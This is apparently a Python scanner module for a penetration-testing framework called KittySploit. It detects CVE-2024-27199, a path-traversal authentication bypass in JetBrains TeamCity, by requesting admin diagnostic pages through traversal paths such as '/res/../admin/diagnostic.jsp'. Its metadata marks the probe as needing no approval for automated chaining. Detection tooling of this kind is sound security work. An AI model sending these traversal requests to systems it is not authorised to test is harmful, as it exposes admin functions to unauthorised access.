#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""In JetBrains TeamCity before 2023."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TeamCity < 2023.11.4 - Authentication Bypass Detection',
        'description': 'In JetBrains TeamCity before 2023.11.4 path traversal allowing to perform limited admin actions was possible',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'teamcity', 'jetbrains', 'auth-bypass', 'vkev', 'vuln', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-27199',
        ],
        'cve': 'CVE-2024-27199',
    }

    def run(self):
        for path in ('/res/../admin/diagnostic.jsp', '/.well-known/acme-challenge/../../admin/diagnostic.jsp', '/update/../admin/diagnostic.jsp'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('Debug Logging', 'CPU & Memory Usage',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="TeamCity < 2023.11.4 - Authentication Bypass detected",
                    path=path,
                )
                return True
        return False

